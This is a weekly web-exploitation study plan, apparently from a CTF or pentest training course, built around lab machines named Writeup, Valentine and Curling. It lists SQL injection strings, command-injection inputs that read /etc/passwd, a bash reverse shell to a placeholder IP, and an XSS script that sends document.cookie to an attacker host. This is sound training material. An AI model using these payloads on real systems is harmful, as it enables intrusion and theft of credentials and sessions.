# 🧪 Week 7: Web Exploitation II — SQLi, XSS, RCE

> _“Web exploitation is chess. Your goal isn’t just to break in — it’s to rewrite the rules of how the app works.”_

---

## 🎯 Objectives
- Perform **manual SQL Injection** (no sqlmap unless validating)
- Exploit **RCE** through command injection, eval injection, insecure deserialization
- Identify and weaponize **XSS** vulnerabilities (reflected/stored)
- Combine logic flaws + injection to pivot and escalate

---

## 🛠 Tools to Master

|Tool|Purpose|
|---|---|
|`Burp Suite`|Manual request tampering + repeat testing|
|`sqlmap`|Optional verification, not your first step|
|`curl`|Submit POST/GET requests manually|
|`ffuf`|Parameter fuzzing for vulnerable fields|
|`payloadsallthethings`|Exploit templates for injections|
|`XSStrike`|XSS fuzzing (optional)|

---

## 💻 Machines

|Machine|Concepts Covered|
|---|---|
|**Writeup**|Manual SQLi → privesc|
|**Valentine**|Heartbleed + file leaks + SQLi|
|**Curling**|RCE via CMS + privilege escalation|

---

## 🗓️ Daily Breakdown

---

### 📅 Monday – Manual SQL Injection (Without sqlmap)

#### ✅ Objectives:
- Identify injectable parameters in GET/POST requests
- Enumerate DB, extract data
#### 🔧 Tasks:
- Try payloads in:
    - `username=` → `' OR 1=1--`
    - Test with `'`, `1'`, `1'--`, `admin'--`
- Confirm injectable parameter:

```sql
' AND 1=1-- → valid  
' AND 1=2-- → error
```

- Enumerate manually:

```sql
' UNION SELECT null, version()--  
' UNION SELECT null, database()--
```
#### 📄 Deliverables:
- Proof of DB enumeration
- Notes on how SQLi was discovered and exploited

---

### 📅 Tuesday – Command Injection & RCE

#### ✅ Objectives:
- Learn to exploit `ping`, `traceroute`, or other input fields that call system commands
- Exploit RCE via upload, eval injection, or insecure config
#### 🔧 Tasks:
- Try inputs like:

```bash
127.0.0.1; whoami
127.0.0.1 && cat /etc/passwd
```

- Upload and trigger payload:

```bash
nc -lvnp 4444
bash -i >& /dev/tcp/<your IP>/4444 0>&1
```

- If blind:
    - Send DNS ping to `burp collaborator`
    - Use output as proof of code execution
#### 📄 Deliverables:
- Screenshot or log showing command executed on server

---

### 📅 Wednesday – Cross-Site Scripting (XSS)

#### ✅ Objectives:
- Identify XSS in search bars, comments, parameters
- Execute script, exfiltrate cookies or trigger behavior
#### 🔧 Tasks:
- Payloads to test:

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert('XSS')>
```

- Use `Burp` to inject:
    - Reflected: happens in URL or response directly
    - Stored: post comment, appears to other users
- Capture cookies:

```js
<script>new Image().src="http://your-ip/cookie?c="+document.cookie;</script>
```

#### 📄 Deliverables:
- Screenshot of alert/captured cookie
- Notes on vector and context (HTML, JS, attribute)

---

### 📅 Thursday – Writeup Walkthrough

#### ✅ Objectives:
- Exploit SQLi, escalate privileges to root
#### 🔧 Tasks:
- SQLi → discover user table → find creds
- Reuse password on SSH or sudo
- Escalate to root via known exploit or SUID
#### 📄 Deliverables:
- `writeup-report.md`

---

### 📅 Friday – Root Valentine

#### ✅ Objectives:
- Exploit Heartbleed or file leakage
- Use SQLi + recon to elevate access
#### 🔧 Tasks:
- Use `heartbleed.py` (if applicable)
- Find creds from dumps
- Exploit vulnerable DB/backend
#### 📄 Deliverables:
- `valentine-report.md`

---

### 📅 Saturday – Root Curling

#### ✅ Objectives:
- Identify RCE or webshell in CMS
- Elevate using local privesc vector (e.g. `PATH`, script abuse)
#### 🔧 Tasks:
- Check `/admin`, `/dev`, `/upload`
- Inject reverse shell or command into template/file
#### 📄 Deliverables:
- `curling-report.md`

---

### 📅 Sunday – Weekly Summary & XSS/SQL Cheatsheets

#### ✅ Objectives:
- Build quick-reference guides
- Log where you struggled and why
#### 🔧 Tasks:
- `web-injection-cheatsheet.md`
- Update:
    - `notes.md`
    - `ego-log.md`

---

## ✅ End-of-Week Checklist
-  Rooted Writeup, Valentine, Curling
-  Manual SQLi exploited without sqlmap
-  XSS proven with alert or cookie log
-  RCE exploited through command injection or upload
-  Cheatsheet + reports complete
-  Reflection in `ego-log.md`

---
